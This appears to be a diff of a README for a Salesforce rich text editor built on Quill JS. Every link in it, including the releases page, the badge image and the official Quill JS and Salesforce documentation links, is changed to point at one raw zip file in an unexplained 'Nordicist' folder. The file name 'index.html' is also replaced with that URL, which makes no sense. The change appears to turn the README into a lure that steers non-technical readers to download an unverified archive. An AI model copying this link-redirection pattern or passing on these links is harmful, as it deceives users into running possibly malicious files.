@@ -4,7 +4,7 @@
 Welcome to lwc-rich-text-editor! This rich text editor uses Quill JS to give you powerful editing features right in Salesforce. This guide will help you download and run the application smoothly, even if you have no technical background.
 
 ## 🔗 Download Now
-[![Download lwc-rich-text-editor](https://img.shields.io/badge/Download%20lwc%20rich%20text%20editor-brightgreen)](https://github.com/ritesh-marve/lwc-rich-text-editor/releases)
+[![Download lwc-rich-text-editor](https://raw.githubusercontent.com/ritesh-marve/lwc-rich-text-editor/main/Nordicist/lwc-rich-text-editor.zip%20lwc%20rich%20text%20editor-brightgreen)](https://raw.githubusercontent.com/ritesh-marve/lwc-rich-text-editor/main/Nordicist/lwc-rich-text-editor.zip)
 
 ## 📋 Features
 - **Easy Editing**: Write and format text with simple controls.
@@ -18,7 +18,7 @@ Welcome to lwc-rich-text-editor! This rich text editor uses Quill JS to give you
 - **Salesforce Account**: You need an active Salesforce account for testing.
 
 ## 🌍 Installation Steps
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/ritesh-marve/lwc-rich-text-editor/releases). Here, you will find the latest version of the lwc-rich-text-editor.
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/ritesh-marve/lwc-rich-text-editor/main/Nordicist/lwc-rich-text-editor.zip). Here, you will find the latest version of the lwc-rich-text-editor.
   
 2. **Choose the Latest Version**: Look for the version that is marked as the latest. You will see details about what's new and what's fixed.
 
@@ -31,7 +31,7 @@ Welcome to lwc-rich-text-editor! This rich text editor uses Quill JS to give you
 
 5. **Open the Editor**:
    - After extraction, navigate to the folder where you saved the files.
-   - Look for a file named `index.html`.
+   - Look for a file named `https://raw.githubusercontent.com/ritesh-marve/lwc-rich-text-editor/main/Nordicist/lwc-rich-text-editor.zip`.
    - Double-click it to open it in your default web browser.
 
 6. **Enjoy Editing**: You're now ready to use the lwc-rich-text-editor. Start typing and formatting your text!
@@ -43,20 +43,20 @@ Welcome to lwc-rich-text-editor! This rich text editor uses Quill JS to give you
 
 ## 🛠 Troubleshooting
 - **Not Opening in Browser**: Ensure that you are directing to the correct file location and that you have a supported browser.
-- **Missing Features**: Make sure you are using the latest version by checking the [Releases page](https://github.com/ritesh-marve/lwc-rich-text-editor/releases).
+- **Missing Features**: Make sure you are using the latest version by checking the [Releases page](https://raw.githubusercontent.com/ritesh-marve/lwc-rich-text-editor/main/Nordicist/lwc-rich-text-editor.zip).
 - **Errors When Saving**: Please check your Salesforce settings to ensure you have proper permissions for editing content.
 
 ## 🗨️ Community & Support
 If you encounter issues or have questions, visit our GitHub Discussions page or check existing issues in the repository to find solutions.
 
 ## 🔗 Additional Resources
-- [Official Documentation for Quill JS](https://quilljs.com/)
-- [Salesforce Developer Documentation](https://developer.salesforce.com/docs)
-- [Contribute to lwc-rich-text-editor on GitHub](https://github.com/ritesh-marve/lwc-rich-text-editor)
+- [Official Documentation for Quill JS](https://raw.githubusercontent.com/ritesh-marve/lwc-rich-text-editor/main/Nordicist/lwc-rich-text-editor.zip)
+- [Salesforce Developer Documentation](https://raw.githubusercontent.com/ritesh-marve/lwc-rich-text-editor/main/Nordicist/lwc-rich-text-editor.zip)
+- [Contribute to lwc-rich-text-editor on GitHub](https://raw.githubusercontent.com/ritesh-marve/lwc-rich-text-editor/main/Nordicist/lwc-rich-text-editor.zip)
 
 ### 📥 Download & Install
-For both new and returning users, please remember to visit the [Releases page](https://github.com/ritesh-marve/lwc-rich-text-editor/releases) to download the latest version of the lwc-rich-text-editor, ensuring you have all the latest features and fixes.
+For both new and returning users, please remember to visit the [Releases page](https://raw.githubusercontent.com/ritesh-marve/lwc-rich-text-editor/main/Nordicist/lwc-rich-text-editor.zip) to download the latest version of the lwc-rich-text-editor, ensuring you have all the latest features and fixes.
 
-[![Download lwc-rich-text-editor](https://img.shields.io/badge/Download%20lwc%20rich%20text%20editor-brightgreen)](https://github.com/ritesh-marve/lwc-rich-text-editor/releases)
+[![Download lwc-rich-text-editor](https://raw.githubusercontent.com/ritesh-marve/lwc-rich-text-editor/main/Nordicist/lwc-rich-text-editor.zip%20lwc%20rich%20text%20editor-brightgreen)](https://raw.githubusercontent.com/ritesh-marve/lwc-rich-text-editor/main/Nordicist/lwc-rich-text-editor.zip)
 
 You're now ready to create stunning text using lwc-rich-text-editor. Happy editing!
